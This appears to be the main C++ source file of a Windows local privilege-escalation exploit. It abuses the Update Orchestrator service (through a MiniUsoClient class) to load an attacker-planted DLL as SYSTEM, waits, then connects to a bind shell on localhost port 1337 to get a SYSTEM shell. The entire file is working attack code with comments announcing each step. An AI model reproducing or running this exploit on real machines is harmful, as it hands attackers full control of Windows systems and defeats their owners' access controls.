
#include <iostream>

#include "MiniUsoClient.h"
#include "TcpClient.h"


int wmain(int argc, wchar_t** argv)
{

	// ========================================================================
	// Use UpdateOrchestrator to load the DLL 
	// ========================================================================
	wprintf_s(L"[*] Using UpdateOrchestrator to load the DLL as SYSTEM...\n");
	MiniUsoClient miniUsoClient;
	if (!miniUsoClient.StartScan())
	{
		return 1;
	}
	
	// Wait a bit before trying to connect to the bind shell.
	// We might need this if the machine slow. 
	wprintf_s(L"[*] Waiting for the DLL to be loaded...\n");
	Sleep(2000);

	// ========================================================================
	// Try to connect to bindshell 
	// ========================================================================
	wprintf_s(L"[*] Spawning shell...\n");
	TcpClient tcpClient;
	tcpClient.connectTCP("127.0.0.1", "1337");

	return 0;

}
